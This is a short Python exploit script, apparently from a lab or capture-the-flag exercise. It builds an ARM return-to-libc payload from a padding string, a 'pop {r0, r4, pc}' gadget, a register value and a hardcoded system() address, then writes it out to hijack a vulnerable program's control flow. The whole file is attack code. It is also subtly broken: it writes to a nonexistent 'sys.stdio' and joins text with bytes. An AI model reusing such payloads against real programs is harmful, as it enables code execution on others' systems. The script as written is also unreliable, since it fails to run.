#!/usr/bin/env python3
import struct
import sys

offset = "AAAABBBBCCCCDDDDEEEEFFFF"

# 101672:   791fc:        e8bd8011        pop     {r0, r4, pc}
_sp = 0xb6ee41fc
_r0 = 0xb6f96b6c
_r4 = 0x46464646
_system = 0xb6ea39c8


sp = struct.pack("<I", _sp)
r0 = struct.pack("<I", _r0)
r4 = struct.pack("<I", _r4)
syst = struct.pack("<I", _system)
sys.stdio.buffer.write(offset + sp + r0 + r4 + syst)

